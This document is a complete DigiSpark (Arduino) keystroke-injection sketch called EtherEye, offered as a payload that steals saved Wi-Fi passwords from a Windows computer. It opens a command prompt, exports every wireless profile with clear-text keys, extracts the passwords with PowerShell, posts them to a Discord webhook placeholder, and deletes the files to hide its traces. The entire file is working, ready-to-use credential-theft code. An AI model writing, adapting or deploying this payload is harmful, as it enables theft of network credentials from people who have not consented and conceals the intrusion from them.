
/*
  EtherEye payload will grab saved Wifi password and will send them to your Discord Webhook.
*/
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //Start Windows Run
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd"); //Open the command prompt
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%"); //Jumping to temporary dir
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("netsh wlan export profile key=clear"); //Grabbing all the saved wifi password and saving them in temporary dir
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt"); //Extracting all password and saving them in Wi-Fi-Pass.txt file in temporary dir
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell -c '$content = [System.IO.File]::ReadAllText(\"%temp%\\Wi-Fi-PASS.txt\").Trim(); $body = @{content = [string]$content} | ConvertTo-Json -Compress; Invoke-RestMethod -Uri \"https://discordapp.com/api/webhooks/YOUR-DISCORD-WEBHOOK-HERE\" -Method Post -Body $body -ContentType \"application/json\" -Headers @{\"Content-Type\"=\"application/json; charset=utf-8\"}'");
  DigiKeyboard.delay(1000);  
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
